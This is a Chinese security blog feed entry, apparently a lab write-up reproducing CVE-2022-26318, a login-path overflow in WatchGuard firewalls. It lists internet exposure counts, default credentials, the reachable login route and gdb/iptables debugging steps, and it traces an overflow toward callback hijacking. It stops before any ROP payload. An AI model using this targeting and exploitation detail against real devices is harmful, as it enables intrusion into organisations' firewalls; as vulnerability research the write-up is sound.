@@ -1,0 +1,1372 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://blog.augustu.top</id>
+    <title>飞光</title>
+    <updated>2024-07-26T08:58:16.130Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://blog.augustu.top"/>
+    <link rel="self" href="https://blog.augustu.top/atom.xml"/>
+    <subtitle>吾不识青天高，黄地厚&lt;br&gt; 
+唯见月寒日暖，来煎人寿</subtitle>
+    <logo>https://blog.augustu.top/images/avatar.png</logo>
+    <icon>https://blog.augustu.top/favicon.ico</icon>
+    <rights>All rights reserved 2024, 飞光</rights>
+    <entry>
+        <title type="html"><![CDATA[CVE-2022-26318 watchguard 防火墙漏洞复现]]></title>
+        <id>https://blog.augustu.top/post/cve-2022-26318/</id>
+        <link href="https://blog.augustu.top/post/cve-2022-26318/">
+        </link>
+        <updated>2024-07-04T11:21:06.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="资产探测">资产探测</h4>
+<ul>
+<li>
+<p>fofa大概能找到77万左右的ip，主要面向北美和欧洲市场</p>
+<ul>
+<li>美国51万多</li>
+<li>德国26万</li>
+<li>意大利22万</li>
+<li>英国11万</li>
+<li>法国9万多</li>
+</ul>
+</li>
+<li>
+<p>中小型企业是其主要群体</p>
+</li>
+<li>
+<p>终端安全领域 市场份额 8.59%</p>
+<table>
+<thead>
+<tr>
+<th><a href="https://6sense.com/tech/endpoint-security/sophos-market-share">Sophos</a></th>
+<th>9,331</th>
+<th>20.72%</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://6sense.com/tech/endpoint-security/trend-micro-market-share">Trend Micro</a></td>
+<td>5,971</td>
+<td>13.26%</td>
+</tr>
+<tr>
+<td><a href="https://6sense.com/tech/endpoint-security/qualys-market-share">Qualys</a></td>
+<td>3,261</td>
+<td>7.24%</td>
+</tr>
+<tr>
+<td><a href="https://6sense.com/tech/endpoint-security/symantec-endpoint-protection-market-share">Symantec Endpoint Protection</a></td>
+<td>3,059</td>
+<td>6.79%</td>
+</tr>
+<tr>
+<td><a href="https://6sense.com/tech/endpoint-security/openvpn-market-share">OpenVPN</a></td>
+<td>2,608</td>
+<td>5.79%</td>
+</tr>
+<tr>
+<td><a href="https://6sense.com/tech/endpoint-security/landesk-market-share">LANDESK</a></td>
+<td>2,363</td>
+<td>5.25%</td>
+</tr>
+<tr>
+<td><a href="https://6sense.com/tech/endpoint-security/microsoft-defender-for-endpoint-market-share">Microsoft Defender for Endpoint</a></td>
+<td>1,632</td>
+<td>3.62%</td>
+</tr>
+</tbody>
+</table>
+<p>单纯防火墙领域占有率较少，但占有率在上升，截至2024年6月，WatchGuard Firebox在防火墙类别中的市场份额为4.1%，前一年3.1%，这里我找了防火墙领域的一些数据</p>
+<figure data-type="image" tabindex="1"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240620150910393.png?x-oss-process=style/zip" alt="image-20240620150910393" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240620145912994.png?x-oss-process=style/zip" alt="image-20240620145912994" loading="lazy"></figure>
+<table>
+<thead>
+<tr>
+<th><strong>Vendor</strong></th>
+<th><strong>4Q22 Revenue</strong></th>
+<th><strong>4Q22 Market Share</strong></th>
+<th><strong>4Q21 Revenue</strong></th>
+<th><strong>4Q21 Market Share</strong></th>
+<th><strong>4Q22/4Q21 Growth</strong></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>1. Palo Alto Networks</td>
+<td>$973.75</td>
+<td>15.9%</td>
+<td>$883.35</td>
+<td>15.1%</td>
+<td>10.2%</td>
+<td></td>
+</tr>
+<tr>
+<td>3. Fortinet</td>
+<td>$966.61</td>
+<td>15.8%</td>
+<td>$776.23</td>
+<td>13.3%</td>
+<td>24.5%</td>
+<td></td>
+</tr>
+<tr>
+<td>2. Cisco</td>
+<td>$921.08</td>
+<td>15.8%</td>
+<td>$885.79</td>
+<td>15.2%</td>
+<td>4.0%</td>
+<td></td>
+</tr>
+<tr>
+<td>4. Check Point</td>
+<td>$473.04</td>
+<td>7.7%</td>
+<td>$462.55</td>
+<td>7.9%</td>
+<td>2.3%</td>
+<td></td>
+</tr>
+<tr>
+<td>5. SonicWALL</td>
+<td>$194.16</td>
+<td>3.2%</td>
+<td>$183.50</td>
+<td>3.1%</td>
+<td>5.8%</td>
+<td></td>
+</tr>
+<tr>
+<td>Rest of Market</td>
+<td>$2,582.05</td>
+<td>42.3%</td>
+<td>$2,645.27</td>
+<td>45.3%</td>
+<td>-2.4%</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Total</strong></td>
+<td><strong>$6,110.69</strong></td>
+<td><strong>100.0%</strong></td>
+<td><strong>$5,836.70</strong></td>
+<td><strong>100.0%</strong></td>
+<td><strong>4.7%</strong></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</li>
+<li>
+<p>全系产品os通用问题</p>
+<p><code>FireboxV</code>在虚拟化平台（如 VMware、Hyper-V）上运行， Firebox T 系列和 M 系列是物理防火墙设备，都运行 WatchGuard 的 Fireware 操作系统，核心功能和操作系统在所有防火墙产品上是通用的</p>
+</li>
+<li>
+<p>web界面</p>
+<p>web界面可以通过8080端口访问，默认密码admin:readwrite</p>
+<figure data-type="image" tabindex="3"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240617151738438.png?x-oss-process=style/zip" alt="image-20240617151738438" loading="lazy"></figure>
+</li>
+<li>
+<p>历史高危漏洞数量</p>
+<p>40个，其中19年2个，21年5个，22年14个，23年5个，24年7个</p>
+</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240617152232235.png?x-oss-process=style/zip" alt="image-20240617152232235" loading="lazy"></figure>
+<h3 id="路由及功能分析"><strong>路由及功能分析</strong></h3>
+<p>从公开信息看，漏洞出现在登录认证处理过程中。WatchGuard 前端为 Nginx，后端为二进制程序，使用 Unix domain socket 通过 fastcgi 代理转发协议进行前后端数据交互。</p>
+<p><code>wgagent</code> 是 WireGuard 的一个代理程序，通常用于管理 WireGuard 的网络接口和密钥，以及提供一些额外的功能，比如自动重新连接和网络监控。</p>
+<p>跟之前<code>FortiGate</code>中着重利用的<code>sslvpn</code>有相同有不同，它们用于实现虚拟私人网络（VPN）连接，但它们在实现方式和使用场景上有所区别</p>
+<ol>
+<li><strong>技术基础</strong>：
+<ul>
+<li><code>wgagent</code> 是与 WireGuard VPN 协议相关联的代理程序。WireGuard 是一种基于内核的 VPN 解决方案，使用自己的加密协议来创建安全的网络隧道。</li>
+<li>SSL VPN 则是利用 Web 浏览器和 SSL/TLS 协议来实现远程访问的一种 VPN 技术。</li>
+</ul>
+</li>
+<li><strong>使用方式</strong>：
+<ul>
+<li><code>wgagent</code> 通常与 WireGuard 一起使用，可能需要在客户端设备上配置 WireGuard 并运行 <code>wgagent</code> 来管理连接。</li>
+<li>SSL VPN 允许用户通过 Web 浏览器直接访问 VPN，无需安装额外的客户端软件。</li>
+</ul>
+</li>
+<li><strong>配置和部署</strong>：
+<ul>
+<li>WireGuard 和 <code>wgagent</code> 可能需要在操作系统级别进行配置，包括设置网络接口和密钥。</li>
+<li>SSL VPN 通常通过 Web 界面进行配置，用户通过浏览器访问 VPN 门户，进行身份验证和连接。</li>
+</ul>
+</li>
+<li><strong>适用场景</strong>：
+<ul>
+<li>WireGuard 和 <code>wgagent</code> 适用于需要高性能、低延迟的 VPN 连接，尤其是在需要设备到设备或点对点连接的场景。</li>
+<li>SSL VPN 更适合于需要快速部署、易于访问的远程工作解决方案，特别是当用户可能使用多种不同的设备和平台时。</li>
+</ul>
+</li>
+<li><strong>安全性和性能</strong>：
+<ul>
+<li>WireGuard 设计上注重安全性和性能，提供了现代的加密标准和高效的数据传输。</li>
+<li>SSL VPN 利用了广泛支持的 SSL/TLS 加密，确保了数据传输的安全性，但其性能可能受到浏览器和网络条件的限制。</li>
+</ul>
+</li>
+</ol>
+<p>可以在 Nginx 中看到配置了 wgagent 的代理转发功能：</p>
+<pre><code class="language-sh">/etc/nginx # grep -nr &quot;wgagent&quot; ./
+./nginx.conf:7:    # rpc calls exposed by wgagent
+./nginx.conf:8:    include    /etc/nginx/http-server-wgagent;
+./nginx.conf:31:    # webui, and subset of wgagent needed by webui and local processes
+./http-server-webui:29:        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
+./http-server-webui:31:        # wgagent is FCGI-native, needs DOCUMENT_ROOT, SCRIPT_NAME.
+./http-server-wgagent:14:        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
+./http-server-wgagent:19:        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
+./http-server-wgagent:22:        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
+./http-server-wgagent:25:        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
+./http-server-wgagent:28:        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
+</code></pre>
+<p>使用<code>lsof</code>查看此文件被进程占用情况，最后定位到 <code>/usr/bin/wgagent</code></p>
+<pre><code>~ # lsof /usr/share/web/upload/tmp/wgagent
+……
+2536    /usr/bin/python 10      /dev/urandom
+2537    /usr/bin/wgagent        0       /dev/null
+2537    /usr/bin/wgagent        1       /dev/null
+2537    /usr/bin/wgagent        2       /dev/null
+2537    /usr/bin/wgagent        3       socket:[6759]
+2537    /usr/bin/wgagent        4       socket:[6760]
+2537    /usr/bin/wgagent        5       socket:[6786]
+2537    /usr/bin/wgagent        6       socket:[6817]
+2537    /usr/bin/wgagent        7       socket:[6818]
+2537    /usr/bin/wgagent        8       socket:[6819]
+……
+</code></pre>
+<p>查看<code>Nginx</code>配置文件</p>
+<pre><code>~ # cat /etc/nginx/nginx.conf
+
+include        /etc/nginx/global;
+
+http {
+    include    /etc/nginx/http-common;
+
+    # rpc calls exposed by wgagent
+    include    /etc/nginx/http-server-wgagent;
+……
+
+    # webui, and subset of wgagent needed by webui and local processes
+    include    /etc/nginx/http-server-webui;
+……
+}
+</code></pre>
+<p>可以确定两种触发路由，但最终实现的效果相同，都是与 <code>/usr/share/web/upload/tmp/wgagent</code> 文件进行数据交互到达 <code>/usr/bin/wgagent</code> 程序中</p>
+<pre><code class="language-nginx">/etc/nginx # cat http-server-webui
+server {
+    listen              127.0.0.1:80;
+    include             /var/run/nginx/webui-port;
+……
+    location /agent/ {
+        root            /usr/share/web/webui;
+        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
+        include         fastcgi_params;
+        # wgagent is FCGI-native, needs DOCUMENT_ROOT, SCRIPT_NAME.
+        fastcgi_param   SCRIPT_NAME $fastcgi_script_name;
+        # /agent/file_action can take a while, e.g. backup
+        fastcgi_read_timeout    10m;
+    }
+}
+</code></pre>
+<pre><code class="language-nginx">/etc/nginx # cat /etc/nginx/http-server-wgagent
+server {
+    listen              4117 ssl;
+    listen              [::]:4117 ssl;
+    location /login {   # no trailing slash
+        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
+    }
+……
+    location /agent/ {
+        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;
+        # /agent/file_action can take a while, e.g. backup
+        fastcgi_read_timeout    10m;
+    }
+    ……
+}
+</code></pre>
+<p>4117 端口开放在全网卡上可对外访问，因此漏洞路由为 <code>https://ip:4117/login</code> 或者是 <code>https://ip:4117/agent/login</code>。</p>
+<p>抓一个登录包</p>
+<pre><code>POST /agent/login HTTP/1.1
+Host: 192.168.150.13:8080
+Cookie: session_id=b1d3391f9234af711618d438e7c1fe9d47307612
+Content-Length: 413
+Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;125&quot;, &quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not.A/Brand&quot;;v=&quot;24&quot;
+Accept: application/xml, text/xml, */*; q=0.01
+Content-Type: text/xml
+X-Requested-With: XMLHttpRequest
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+Sec-Ch-Ua-Platform: &quot;Windows&quot;
+Origin: https://192.168.150.13:8080
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://192.168.150.13:8080/auth/login?from_page=/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Priority: u=1, i
+Connection: keep-alive
+
+&lt;methodCall&gt;&lt;methodName&gt;login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;root&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;augustu&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;domain&lt;/name&gt;&lt;value&gt;&lt;string&gt;Firebox-DB&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;uitype&lt;/name&gt;&lt;value&gt;&lt;string&gt;2&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;
+</code></pre>
+<p>可以看出 WatchGuard 在登录认证部分使用 XML 数据进行交互，这就意味着在 WatchGuard 服务中肯定存在 XML 数据解析代码</p>
+<h3 id="定位漏洞点">定位漏洞点</h3>
+<p>尝试通过补丁对比，大概定位到漏洞点。</p>
+<p>学习了一下<code>bindiff</code>的使用，找到<code>watchguard</code>历史文件下载位置</p>
+<figure data-type="image" tabindex="5"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618160506152.png?x-oss-process=style/zip" alt="image-20240618160506152" loading="lazy"></figure>
+<p>大概了解了一下以后，创建<code>v12.8</code>版本虚拟机并且下载对应<code>wgagent</code>文件，通过<code>bindiff</code>进行分析</p>
+<figure data-type="image" tabindex="6"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618162736253.png?x-oss-process=style/zip" alt="image-20240618162736253" loading="lazy"></figure>
+<p>按相似度排列逐个分析后，最终找到<code>sub_4067EF</code>中删除了 <code>strcat</code> 危险函数，猜测漏洞出在这里</p>
+<figure data-type="image" tabindex="7"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618162453080.png?x-oss-process=style/zip" alt="image-20240618162453080" loading="lazy"></figure>
+<img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618163729503.png?x-oss-process=style/zip" alt="image-20240618163729503" style="zoom:200%;" />
+<h3 id="逻辑梳理">逻辑梳理</h3>
+<p>在 <code>wgagent</code> 中存在路由匹配规则，程序收到的 <code>/login</code> 以及 <code>/agent/login</code> 数据将会进入 <code>sub_40B737</code> 函数处理：</p>
+<pre><code class="language-c">  if ( s1 &amp;&amp; (!strcmp(s1, &quot;/login&quot;) || !strcmp(s1, &quot;/agent/login&quot;)) )
+  {
+    sub_40B737(&amp;ptr, tp.tv_sec, tp.tv_nsec);
+    goto LABEL_396;
+  }
+</code></pre>
+<p>此函数的开始部分会解析来自 POST 包中的 XML 数据，处理逻辑如下：</p>
+<pre><code class="language-c">  if ( (int)wglog_diag_level(0xFFFFFFFFLL) &gt; 3 )
+  {
+    v1 = (const char *)FCGX_GetParam(&quot;HTTP_USER_AGENT&quot;, v43[4]);
+    wglog_trace_r(0xFFFFFFFFLL, 4LL, 7LL, &quot;src/modules/wgagent/main.c&quot;, 2558LL, &quot;wga_login&quot;, &quot;user-agent = '%s'&quot;, v1);
+  }
+  v2 = FCGX_GetParam(&quot;HTTP_CONTENT_ENCODING&quot;, v43[4]);
+  v42 = xml_parse(v43[1], v2);    // xml解析
+  if ( !v42 || !*(_QWORD *)(v42 + 120) )
+  {
+    sub_40740D(v43[2], 400LL, &quot;Invalid XML-RPC request&quot;);
+    FCGX_FFlush(v43[2]);
+    return 0LL;
+  }
+</code></pre>
+<p>漏洞就在 <code>xml_parse（0x40869D）</code> 函数，主要是因为 WatchGuard 自己写的 XML 回调函数中对 bss 段上的数据进行赋值，并产生缓冲区溢出，使得超长部分数据溢出到堆上。经过分析代码找到了存储在 bss 段上的变量，如下所示：</p>
+<pre><code class="language-c">  if ( ptr )
+  {
+    v23 = xmlCreatePushParserCtxt(s, ptr, 0LL, 0LL, &quot;filename&quot;);
+    if ( v23 )
+    {
+      ::s[0] = 0;                            //存储在 bss 段上的变量
+      bzero(haystack, 0x186A0uLL);
+      do
+      {
+        v33 = FCGX_GetStr(haystack, v22, a1);
+</code></pre>
+<pre><code>.bss:0000000000427360 s               db 400h dup(?)          ; DATA XREF: sub_406797+14↑o
+.bss:0000000000427360                                         ; sub_4067EF:loc_406D54↑o ...
+</code></pre>
+<p>知道了缓冲区的位置，尝试在 <code>wgagent</code> 程序中定位真正的漏洞点，查看使用了 <code>s</code> 变量的位置：</p>
+<figure data-type="image" tabindex="8"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618165653502.png?x-oss-process=style/zip" alt="image-20240618165653502" loading="lazy"></figure>
+<p>定位到之前猜测的位置</p>
+<figure data-type="image" tabindex="9"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618165808639.png?x-oss-process=style/zip" alt="image-20240618165808639" loading="lazy"></figure>
+<p>继续分析上下文代码，寻找如何控制 <code>a2</code> 变量：</p>
+<pre><code class="language-C">switch ( *(_DWORD *)(a1 + 80) )
+      {
+        case 1:
+          if ( strcasecmp(a2, &quot;methodName&quot;) )
+          {
+            result = (int *)a1;
+            ++*(_DWORD *)(a1 + 76);
+            return result;
+          }
+          *(_DWORD *)(a1 + 80) = 2;
+          break;
+        case 3:
+          if ( !strcasecmp(a2, &quot;member&quot;) )
+</code></pre>
+<p><code>a2</code> 看起来是 xml 文档中的标签值，应该是函数解析的 xml 文档标签。尝试通过漏洞调试验证。</p>
+<h3 id="gdb调试">GDB调试</h3>
+<p>按照之前<code>FortiGate</code>的经验，应该是尝试上传<code>gdbserver</code></p>
+<p>上传以后成功开启GDBserver</p>
+<figure data-type="image" tabindex="10"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618181903257.png?x-oss-process=style/zip" alt="image-20240618181903257" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240618182133450.png?x-oss-process=style/zip" alt="image-20240618182133450" loading="lazy"></figure>
+<p>这里一开始以为是端口问题，尝试了一下感觉可能得放行防火墙端口，网上看了一下确实有人用的这种方法，但这里需要密钥，我尝试注册获得，但<code>watchguard</code>必须得有序列号，一个设备对应一个码，因为只是虚拟机没能成功获得</p>
+<figure data-type="image" tabindex="12"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240619104808497.png?x-oss-process=style/zip" alt="image-20240619104808497" loading="lazy"></figure>
+<p>最后尝试直接在终端使用命令来配置，用 <code>iptables</code> 对所有数据包放行，发现可以成功连接远程<code>gdbserver</code></p>
+<pre><code>iptables -I INPUT 1 -i eth0 -j ACCEPT
+gdbserver --attach 0.0.0.0:15432 $(busybox pidof wgagent)
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240619105225411.png?x-oss-process=style/zip" alt="image-20240619105225411" loading="lazy"></figure>
+<p>根据原登录请求改了一个<code>XML</code>报文，具体如下</p>
+<pre><code>POST /agent/login HTTP/1.1
+Host: 192.168.150.13:8080
+Cookie: sessionid=0204F13453FD8152BAD1473ED8B7B3CE92175ABA; session_id=9e5e779fb01c9e5d4e26d04ae39133785c220e1c
+Content-Length: 410
+Sec-Ch-Ua: &quot;Not/A)Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;126&quot;, &quot;Microsoft Edge&quot;;v=&quot;126&quot;
+Accept: application/xml, text/xml, */*; q=0.01
+Content-Type: text/xml
+X-Requested-With: XMLHttpRequest
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0
+Sec-Ch-Ua-Platform: &quot;Windows&quot;
+Origin: https://192.168.150.13:8080
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://192.168.150.13:8080/auth/login
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Priority: u=1, i
+Connection: keep-alive
+
+&lt;methodCall&gt;
+   &lt;methodName&gt;test&lt;/methodName&gt;
+      &lt;params&gt;
+         &lt;param&gt;
+            &lt;value&gt;&lt;double&gt;aaaa&lt;/double&gt;&lt;/value&gt;
+         &lt;/param&gt;
+      &lt;/params&gt;
+&lt;/methodCall&gt;
+</code></pre>
+<p>成功在调用<code>strcat</code>处断住</p>
+<figure data-type="image" tabindex="14"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240619150648601.png?x-oss-process=style/zip" alt="image-20240619150648601" loading="lazy"></figure>
+<p>尝试发送任意<code>XML</code>报文，发现报错，并且没有在上述函数处断住</p>
+<figure data-type="image" tabindex="15"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240619151041760.png?x-oss-process=style/zip" alt="image-20240619151041760" loading="lazy"></figure>
+<p>也就是说，必须要发送<code>XML-RPC</code>格式的数据</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<h4 id="堆溢出">堆溢出</h4>
+<p>尝试在此断点处使用<code>x/s $rdi</code>打印<code>strcat</code>第一个参数，如下</p>
+<pre><code>pwndbg&gt; i b
+Num     Type           Disp Enb Address            What
+5       breakpoint     keep y   0x0000000000406d99 
+        breakpoint already hit 2 times
+        x/s $rdi
+</code></pre>
+<p>发现会打印如下内容</p>
+<pre><code>0x427360:       &quot;/&quot;
+0x427360:       &quot;/methodCall/&quot;
+0x427360:       &quot;/methodCall/&quot;
+0x427360:       &quot;/methodCall/params/&quot;
+0x427360:       &quot;/methodCall/params/param/&quot;
+0x427360:       &quot;/methodCall/params/param/value/&quot;
+</code></pre>
+<p>因为在<code>逻辑梳理</code>部分中，已经确定<code>0x427360</code>的变量就在<code>.bss</code>段上，也就是说 <code>strcat</code> 会将标签拼接在一起放在<code> bss</code> 段上</p>
+<p>猜想：如果发包时控制一下，是否可以通过<code>strcat</code>溢出到堆上</p>
+<p>查看当前进程的内存映射，发现目标地址<code>0x427360</code>位于堆<code>0x428000</code>之前的块中，看来溢出到堆上进行堆利用的想法是可行的</p>
+<pre><code class="language-sh">pwndbg&gt; info proc mapping
+process 2899
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+            0x400000           0x405000     0x5000        0x0 /usr/bin/wgagent
+            0x405000           0x41e000    0x19000     0x5000 /usr/bin/wgagent
+            0x41e000           0x425000     0x7000    0x1e000 /usr/bin/wgagent
+            0x425000           0x426000     0x1000    0x24000 /usr/bin/wgagent
+            0x426000           0x428000     0x2000    0x25000 /usr/bin/wgagent
+</code></pre>
+<h3 id="溢出-xml-sax-handler-结构体">溢出 XML SAX Handler 结构体</h3>
+<p>上面GDB调试的时候发现，每解析一个标签，<code>sub_4067EF</code>就会被回调一次，那么如果能够覆盖回调函数为任意地址，就可以实现劫持程序执行流了</p>
+<p>使用<code>peda</code>在内存中搜索 <code>0x4067ef</code></p>
+<pre><code>gdb-peda$ find 0x4067ef  
+Searching for '0x4067ef' in: None ranges  
+Found 2 results, display max 2 items:  
+ [heap] : 0x429e68 --&gt; 0x4067ef (push   rbp)  
+[stack] : 0x7ffcefb22c68 --&gt; 0x4067ef (push   rbp)
+</code></pre>
+<p>找到了两处地址，分别在堆上和栈上</p>
+<p>查看一下内存</p>
+<pre><code>gdb-peda$ x/10w 0x429e68-0x10
+0x429e58:       0xdeedbeaf      0x00000000      0x00000000      0x00000000
+0x429e68:       0x004067ef      0x00000000      0x00406dce      0x00000000
+0x429e78:       0x00000000      0x00000000
+</code></pre>
+<p>这里我感觉<code> 0xdeedbeaf</code>这个数值得注意，一般来说这是一个常用的魔数，我把它跟<code>SAX</code>在一起搜索，没什么结果</p>
+<p>后面我去简单学习了一下<code>SAX</code>,它是一种用于解析XML文档的事件驱动API，允许应用程序在解析XML文档时响应各种事件，如元素的开始和结束、文本数据的读取等，最后发现这个API是通过<code>libxml2</code>实现的，当我一起搜索<code>libxml2</code>与<code>0xdeedbeaf</code>时，发现此魔数是<code>libxml2</code>指定的魔数</p>
+<figure data-type="image" tabindex="16"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240627145455370.png?x-oss-process=style/zip" alt="image-20240627145455370" loading="lazy"></figure>
+<p>那么很明显了，这里就是<code>SAX</code>处理结构</p>
+<p><strong>不重要部分：</strong></p>
+<p>开始 ROP之前需要保证 栈上的数据是可控的，搜索栈空间查看是否有可控的数据</p>
+<pre><code>gdb-peda$ find &quot;methodName&quot;
+Searching for 'methodName' in: None ranges
+Found 7 results, display max 7 items:
+wgagent : 0x41e9ef (&quot;methodName&quot;)
+ [heap] : 0x432be5 (&quot;methodName&gt;login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;aaaaa&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;18136659462&lt;/string&gt;&lt;/valu&quot;...)
+ [heap] : 0x432bf7 (&quot;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;aaaaa&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;18136659462&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&quot;...)
+ [heap] : 0x436dad (&quot;methodName&gt;login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;aaaaa&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;18136659462&lt;/string&gt;&lt;/valu&quot;...)
+ [heap] : 0x436dbf (&quot;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;aaaaa&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;18136659462&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&quot;...)
+[stack] : 0x7ffcdf15320d (&quot;methodName&gt;login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;aaaaa&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;18136659462&lt;/string&gt;&lt;/valu&quot;...)
+[stack] : 0x7ffcdf15321f (&quot;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;password&lt;/name&gt;&lt;value&gt;&lt;string&gt;aaaaa&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;user&lt;/name&gt;&lt;value&gt;&lt;string&gt;18136659462&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&quot;...)
+</code></pre>
+<p>监视回调的堆地址，等待它被覆盖，但发现回调被覆盖时，显示的值为<code>0xcd1cf040</code></p>
+<figure data-type="image" tabindex="17"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240627155631358.png?x-oss-process=style/zip" alt="image-20240627155631358" loading="lazy"></figure>
+<p>重启后发现这里的值变化了</p>
+<figure data-type="image" tabindex="18"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240627163913507.png?x-oss-process=style/zip" alt="image-20240627163913507" loading="lazy"></figure>
+<p>这里思考之前的溢出问题，直接使用大量的A造成溢出，断在了libc.so.6中</p>
+<figure data-type="image" tabindex="19"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240627175256865.png?x-oss-process=style/zip" alt="image-20240627175256865" loading="lazy"></figure>
+<p>尝试构造合适的payload</p>
+<p>尝试寻找gadgets，但没有找到合适的，最后发现生成的gadgets有问题</p>
+<h4 id="问题">问题</h4>
+<ul>
+<li>gadgets中地址与GDB中调试显示地址不一致</li>
+<li>gadgets中无可用gadget</li>
+</ul>
+<p>结果：</p>
+<ul>
+<li>基地址问题</li>
+<li>二进制文件错误</li>
+</ul>
+<h3 id="寻找-rop-chains">寻找 ROP Chains</h3>
